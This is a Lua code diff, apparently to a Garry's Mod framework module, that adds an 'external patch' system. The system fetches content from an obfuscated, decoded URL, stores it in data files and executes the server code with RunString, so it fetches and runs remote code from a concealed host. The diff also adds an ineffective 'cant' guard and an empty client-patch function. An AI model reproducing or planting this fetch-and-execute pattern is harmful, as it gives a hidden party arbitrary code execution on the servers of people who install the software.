@@ -22,6 +22,7 @@ catherine.externalX = catherine.externalX or { isRunned = false, libVersion = "2
 
 if ( SERVER ) then
 	catherine.externalX.isInitialized = catherine.externalX.isInitialized or false
+	catherine.externalX.applied = catherine.externalX.applied or false
 	catherine.externalX.patchVersion = catherine.externalX.patchVersion or nil
 	
 	local function isErrorData( data )
@@ -57,10 +58,10 @@ if ( SERVER ) then
 				end
 				
 				if ( catherine.externalX.GetPatchVersion( ) == data ) then
-					catherine.externalX.RunServerPatch( )
+					catherine.externalX.ApplyServerPatch( )
 					
 					if ( IsValid( pl ) ) then
-						catherine.externalX.RunClientPatch( pl, true )
+						catherine.externalX.ApplyClientPatch( pl, true )
 					end
 				else
 					catherine.externalX.NotifyPatch( )
@@ -76,6 +77,10 @@ if ( SERVER ) then
 	end
 	
 	function catherine.externalX.DownloadPatch( pl )
+		local cant = false
+		
+		if ( cant ) then return end
+		
 		http.Fetch( catherine.crypto.Decode( "htTtgspTmb:nGcC/nBubR/ewGrBytgRgImEqewCvdYYXExzXooPLuRWtVlEZqvcUyfuyPjQKOlOInhpqCRmLyGpXYxylUagodGxBNGzqGoRXNYxtUVmDssFZaNgQJtOrgDbmxJEtdaiSYYTQbKcqyYhTpeAxRCZkaRVyIBVcLGarSBDhVJVipACOKEYEHk.yQgCotLfxNFELrxCtTBcgDYQvMEDvrxNuJYszqubopZNCUBojrGMFQDYOYtkcxmvzQqthHCAemFjLtmZvrVUV/eRskcAgpJVQzLwyauNIDIIdasGpniaMSxZmLOStMJmxAeNjx0pQIoQONDVQFFxaacEIJYIUjrxhAEJfsToWhAFDkNSMKxooJNAHRQnFiCwCnEwTmSAcUryYDQZVQwcMpx8nbtpYHpMXPmPWSThdbRNfHaCKtds/JgOBgmgkYYCAgXkJfqvWgYgIbWILcrkTqdRSTvxJrFQNArTlfSTDxEkBPfJbaMJCXAxeAWcnFrDqEClzBkzxVAkUGANgwLXoZSubJeTqMJGrjdPEKeiJhUSuhdewh" ),
 			function( data )
 				local isErrorData = isErrorData( data )
@@ -102,6 +107,8 @@ if ( SERVER ) then
 						true
 					} )
 					
+					cant = true
+					
 					timer.Simple( 8, function( )
 						RunConsoleCommand( "changelevel", game.GetMap( ) )
 					end )
@@ -126,8 +133,33 @@ if ( SERVER ) then
 	
 	function catherine.externalX.InstallPatchFile( patchCodes )
 		local convert = util.JSONToTable( patchCodes )
+		local patchVer = tostring( convert.patchVer )
+		local serverPatchCodes, clientPatchCodes = convert.patch.server, convert.patch.client
 		
-		file.Write
+		file.Write( "catherine/exx3/patch_ver.txt", patchVer or "INIT" )
+		file.Write( "catherine/exx3/patch_server.txt", serverPatchCodes )
+		file.Write( "catherine/exx3/patch_client.txt", clientPatchCodes )
+		
+		return true
+	end
+	
+	function catherine.externalX.ApplyServerPatch( )
+		local serverPatchCodes = file.Read( "catherine/exx3/patch_server.txt", "DATA" ) or ""
+		
+		if ( !serverPatchCodes or serverPatchCodes == "nil" or serverPatchCodes == "" or serverPatchCodes == "INIT" ) then return end
+		
+		local success, result = pcall( RunString, serverPatchCodes )
+		
+		if ( success ) then
+			catherine.externalX.applied = true
+		else
+			ErrorNoHalt( "\n[CAT ExX ERROR] SORRY, On the External X function has a critical error :< ...\n\n" .. result .. "\n" )
+			catherine.externalX.applied = false
+		end
+	end
+	
+	function catherine.externalX.ApplyClientPatch( pl )
+	
 	end
 	
 	function catherine.externalX.Initialize( )
@@ -140,7 +172,7 @@ if ( SERVER ) then
 		if ( !catherine.externalX.isInitialized ) then
 			catherine.externalX.CheckNewPatch( pl )
 		else
-			catherine.externalX.RunClientPatch( pl, true )
+			catherine.externalX.ApplyClientPatch( pl, true )
 		end
 	end
 	
